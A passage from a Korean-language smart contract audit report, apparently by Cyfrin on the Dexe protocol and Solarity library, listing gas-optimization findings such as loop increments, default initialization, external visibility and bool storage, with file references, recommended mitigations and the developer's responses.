189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolUnlock.sol

27:         for (uint256 i; i < proposalIds.length; i++) {

27:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolView.sol

60:         for (uint256 i = offset; i < to; i++) {

60:         for (uint256 i = offset; i < to; i++) {

147:         for (uint256 i; i < unlockedIds.length; i++) {

147:         for (uint256 i; i < unlockedIds.length; i++) {

168:         for (uint256 i; i < proposalsLength; i++) {

168:         for (uint256 i; i < proposalsLength; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

174:         for (uint256 i; i < nftIds.length; i++) {

174:         for (uint256 i; i < nftIds.length; i++) {

```

```solidity
File: libs/gov/gov-user-keeper/GovUserKeeperView.sol

35:         for (uint256 i = 0; i < users.length; i++) {

35:         for (uint256 i = 0; i < users.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

126:                     for (uint256 i; i < nftIds.length; i++) {

126:                     for (uint256 i; i < nftIds.length; i++) {

139:                 for (uint256 i; i < nftIds.length; i++) {

139:                 for (uint256 i; i < nftIds.length; i++) {

165:         for (uint256 i; i < delegationsInfo.length; i++) {

165:         for (uint256 i; i < delegationsInfo.length; i++) {

192:         for (uint256 i; i < lockedProposals.length; i++) {

192:         for (uint256 i; i < lockedProposals.length; i++) {

201:         for (uint256 i; i < nftsLength; i++) {

201:         for (uint256 i; i < nftsLength; i++) {

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsCreate.sol

141:         for (uint256 i = 0; i < tokensLength; i++) {

141:         for (uint256 i = 0; i < tokensLength; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsExecute.sol

42:         for (uint256 i = 0; i < length; i++) {

42:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsUtils.sol

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol

205:         for (uint256 i = 0; i < lockedTokenLength; i++) {

205:         for (uint256 i = 0; i < lockedTokenLength; i++) {

217:         for (uint256 i = 0; i < lockedNftLength; i++) {

217:         for (uint256 i = 0; i < lockedNftLength; i++) {

229:         for (uint256 i = 0; i < purchaseTokenLength; i++) {

229:         for (uint256 i = 0; i < purchaseTokenLength; i++) {

251:         for (uint256 i = 0; i < length; i++) {

251:         for (uint256 i = 0; i < length; i++) {

279:         for (uint256 i = 0; i < length; i++) {

279:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalCreate.sol

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

93:         for (uint256 i = offset; i < to; i++) {

93:         for (uint256 i = offset; i < to; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

```

```solidity
File: libs/price-feed/UniswapV2PathFinder.sol

79:         for (uint256 i = 0; i < length; i++) {

79:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/utils/AddressSetHelper.sol

10:         for (uint256 i = 0; i < array.length; i++) {

10:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

```


**권장 완화 방법:** 오버플로가 불가능할 때 루프 카운터를 증가시키기 위해 unchecked 블록을 사용하거나 Solidity 0.8.22로 업그레이드하십시오.

이전:
```solidity
for (uint256 i = 0; i < params.users.length; i++) {
```

이후:
```solidity
uint256 loopLength = params.users.length;
for (uint256 i; i < loopLength;) {
    // logic goes here


    // increment loop at the end
    unchecked {++i;}
}
```

**Dexe:**
인지함. 우리는 2-3 wei의 최적화를 큰 이점으로 간주하지 않습니다. 이 경우 코드 가독성이 우선입니다.


### 변수를 기본값으로 초기화하지 마십시오

**설명:** 변수를 기본값으로 초기화하지 마십시오.

**영향:** 가스 최적화.

**개념 증명 (Proof of Concept):**
```solidity
File: gov/ERC20/ERC20Gov.sol

55:         for (uint256 i = 0; i < params.users.length; i++) {

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

461:         for (uint256 i = 0; i < nftIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCredit.sol

27:         for (uint256 i = 0; i < length; i++) {

33:         for (uint256 i = 0; i < tokens.length; i++) {

49:         for (uint256 i = 0; i < infoLength; i++) {

70:         for (uint256 i = 0; i < tokensLength; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-user-keeper/GovUserKeeperView.sol

35:         for (uint256 i = 0; i < users.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsCreate.sol

141:         for (uint256 i = 0; i < tokensLength; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsExecute.sol

42:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsUtils.sol

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol

205:         for (uint256 i = 0; i < lockedTokenLength; i++) {

217:         for (uint256 i = 0; i < lockedNftLength; i++) {

229:         for (uint256 i = 0; i < purchaseTokenLength; i++) {

251:         for (uint256 i = 0; i < length; i++) {

279:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalCreate.sol

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

```

```solidity
File: libs/math/LogExpMath.sol

350:         int256 sum = 0;

```

```solidity
File: libs/price-feed/UniswapV2PathFinder.sol

79:         for (uint256 i = 0; i < length; i++) {

```

```solidity
File: libs/utils/AddressSetHelper.sol

10:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

```

```solidity
File: mock/gov/PolynomTesterMock.sol

58:         for (uint256 i = 0; i < users.length; i++) {

```

Solarity 라이브러리에서:

```solidity
File: access-control/RBAC.sol

103:         for (uint256 i = 0; i < permissionsToAdd_.length; i++) {

124:         for (uint256 i = 0; i < permissionsToRemove_.length; i++) {

173:         for (uint256 i = 0; i < allowed_.length; i++) {

178:         for (uint256 i = 0; i < disallowed_.length; i++) {

200:         for (uint256 i = 0; i < roles_.length; i++) {

```

```solidity
File: access-control/extensions/RBACGroupable.sol

116:         for (uint256 i = 0; i < userGroupsLength_; ++i) {

157:         for (uint256 i = 0; i < roles_.length; i++) {

169:         for (uint256 i = 0; i < groups_.length; i++) {

172:             for (uint256 j = 0; j < roles_.length; j++) {

```

```solidity
File: contracts-registry/pools/AbstractPoolContractsRegistry.sol

125:         for (uint256 i = 0; i < names_.length; i++) {

```

```solidity
File: diamond/Diamond.sol

110:         for (uint256 i = 0; i < selectors_.length; i++) {

134:         for (uint256 i = 0; i < selectors_.length; i++) {

```

```solidity
File: diamond/DiamondStorage.sol

55:         for (uint256 i = 0; i < facets_.length; i++) {

75:         for (uint256 i = 0; i < selectors_.length; i++) {

```

```solidity
File: libs/arrays/ArrayHelper.sol

160:         for (uint256 i = 0; i < what_.length; i++) {

172:         for (uint256 i = 0; i < what_.length; i++) {

184:         for (uint256 i = 0; i < what_.length; i++) {

196:         for (uint256 i = 0; i < what_.length; i++) {

```

```solidity
File: libs/arrays/SetHelper.sol

22:         for (uint256 i = 0; i < array_.length; i++) {

28:         for (uint256 i = 0; i < array_.length; i++) {

34:         for (uint256 i = 0; i < array_.length; i++) {

45:         for (uint256 i = 0; i < array_.length; i++) {

51:         for (uint256 i = 0; i < array_.length; i++) {

57:         for (uint256 i = 0; i < array_.length; i++) {

```

```solidity
File: libs/data-structures/memory/Vector.sol

287:         for (uint256 i = 0; i < length_; ++i) {

```

```solidity
File: mock/libs/arrays/PaginatorMock.sol

46:         for (uint256 i = 0; i < length_; i++) {

```

```solidity
File: mock/libs/data-structures/StringSetMock.sol

38:         for (uint256 i = 0; i < set_.length; i++) {

```

```solidity
File: mock/libs/data-structures/memory/VectorMock.sol

42:         for (uint256 i = 0; i < vector2_.length(); i++) {

70:         for (uint256 i = 0; i < vector_.length(); i++) {

89:         for (uint256 i = 0; i < 10; i++) {

100:         for (uint256 i = 0; i < array_.length; i++) {

123:         for (uint256 i = 0; i < 50; i++) {

```

```solidity
File: mock/libs/zkp/snarkjs/VerifierMock.sol

34:         for (uint256 i = 0; i < inputs_.length; i++) {

54:         for (uint256 i = 0; i < inputs_.length; i++) {

```

```solidity
File: oracles/UniswapV2Oracle.sol

65:         for (uint256 i = 0; i < pairsLength_; i++) {

103:         for (uint256 i = 0; i < pathLength_ - 1; i++) {

178:         for (uint256 i = 0; i < numberOfPaths_; i++) {

187:             for (uint256 j = 0; j < pathLength_ - 1; j++) {

208:         for (uint256 i = 0; i < numberOfPaths_; i++) {

216:             for (uint256 j = 0; j < pathLength_ - 1; j++) {

```


**권장 완화 방법:** 변수를 기본값으로 초기화하지 마십시오.

**Dexe:**
인지함; 우리는 2-3 wei의 최적화를 큰 이점으로 간주하지 않습니다. 이 경우 코드 가독성이 우선입니다. 합리적인 곳이면 어디든지 코드를 최적화했습니다.


### 내부적으로 사용되지 않는 함수는 외부(external)로 표시할 수 있음

**설명:** 내부적으로 사용되지 않는 함수는 `external`로 표시할 수 있습니다. 일반적으로 `external` 함수는 `public` 함수보다 가스 오버헤드가 적습니다.

**개념 증명 (Proof of Concept):**
```solidity
File: factory/PoolFactory.sol

53:     function setDependencies(address contractsRegistry, bytes memory data) public override {

```

```solidity
File: factory/PoolRegistry.sol

43:     function setDependencies(address contractsRegistry, bytes memory data) public override {

```

```solidity
File: gov/ERC721/multipliers/AbstractERC721Multiplier.sol

29:     function __ERC721Multiplier_init(

77:     function supportsInterface(

```

```solidity
File: gov/GovPool.sol

132:     function setDependencies(address contractsRegistry, bytes memory) public override dependant {

141:     function unlock(address user) public override onlyBABTHolder {

145:     function execute(uint256 proposalId) public override onlyBABTHolder {

373:     function getProposalState(uint256 proposalId) public view override returns (ProposalState) {

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

234:     function uri(uint256 tierId) public view override returns (string memory) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

665:     function nftVotingPower(

```

```solidity
File: user/UserRegistry.sol

19:     function __UserRegistry_init(string calldata name) public initializer {

67:     function userInfos(address user) public view returns (UserInfo memory) {

```

**권장 완화 방법:** 위의 함수를 `external`로 표시하는 것을 고려하십시오.

**Dexe:**
커밋 [b417eaf](https://github.com/dexe-network/DeXe-Protocol/commit/b417eafe501100b8c36ec92494798bbd73add796)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 스토리지에 bool을 사용하면 오버헤드가 발생함

**설명:** `uint256(1)` 및 `uint256(2)`를 true/false로 사용하여 Gwarmaccess(100 가스)를 피하고 과거에 'true'였다가 'false'에서 'true'로 변경할 때 Gsset(20000 가스)을 피하십시오. [소스](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27)를 참조하십시오.

**영향:** 가스 최적화

**개념 증명 (Proof of Concept):**
```solidity
File: factory/PoolFactory.sol

41:     mapping(bytes32 => bool) private _usedSalts;

```

```solidity
File: gov/GovPool.sol

76:     bool public onlyBABTHolders;

```

```solidity
File: gov/validators/GovValidators.sol

35:     mapping(uint256 => mapping(bool => mapping(address => mapping(bool => uint256))))

```

```solidity
File: interfaces/gov/IGovPool.sol

197:         mapping(uint256 => bool) isClaimed;

207:         mapping(uint256 => bool) areVotingRewardsSet;

287:         mapping(bytes32 => bool) usedHashes;

```

```solidity
File: interfaces/gov/proposals/IDistributionProposal.sol

16:         mapping(address => bool) claimed;

```

Solarity 라이브러리에서:

```solidity
File: access-control/RBAC.sol

42:     mapping(string => mapping(bool => mapping(string => StringSet.Set))) private _rolePermissions;

43:     mapping(string => mapping(bool => StringSet.Set)) private _roleResources;

```

```solidity
File: compound-rate-keeper/AbstractCompoundRateKeeper.sol

31:     bool private _isMaxRateReached;

```

```solidity
File: contracts-registry/AbstractContractsRegistry.sol

42:     mapping(address => bool) private _isProxy;

```

```solidity
File: diamond/tokens/ERC721/DiamondERC721Storage.sol

36:         mapping(address => mapping(address => bool)) operatorApprovals;

```

**권장 완화 방법:** `bool`을 `uint256`으로 교체하는 것을 고려하십시오.

**Dexe:**
인지함; 우리는 2-3 wei의 최적화를 큰 이점으로 간주하지 않습니다. 이 경우 코드 가독성이 우선입니다.
